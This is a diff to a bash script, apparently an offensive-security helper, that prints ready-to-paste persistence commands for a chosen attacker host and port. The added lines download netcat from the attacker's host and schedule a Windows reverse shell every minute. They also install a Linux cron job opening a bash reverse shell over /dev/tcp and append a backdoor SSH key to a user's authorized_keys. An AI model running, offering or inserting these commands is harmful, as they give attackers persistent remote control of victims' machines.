@@ -1,5 +1,7 @@
 #!/bin/bash
 
+DEFAULT_TOOLS_PORT=31337
+
 # Colors
 GREEN='\033[0;32m' # Green
 NC='\033[0m'       # No Color
@@ -15,9 +17,9 @@ fi
 
 if [ $# -eq 0 ]
 then
-  TOOLS_PORT=31337
+  LPORT=443
 else
-  TOOLS_PORT=$1
+  LPORT=$1
 fi
 
 cat << "EOF"
@@ -41,7 +43,13 @@ echo ""
 echo
 echo '********** Windows **********'
 echo
+echo "iwr -uri http://$LHOST:$DEFAULT_TOOLS_PORT/windows/nc64.exe -Outfile C:\Windows\Temp\nc.exe"
+echo "schtasks /create /sc minute /mo 1 /tn \"Reverse shell\" /tr \"C:\Windows\Temp\nc.exe $LHOST $LPORT -e cmd.exe\""
 
 echo
 echo '********** Linux **********'
-
+echo
+echo "(touch .tab ; echo \"*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1"
+echo
+BACKDOOR_PUB=$(cat ~/.ssh/backdoor.pub)
+echo "echo \"$BACKDOOR_PUB\" >> /home/<user>/.ssh/authorized_keys"
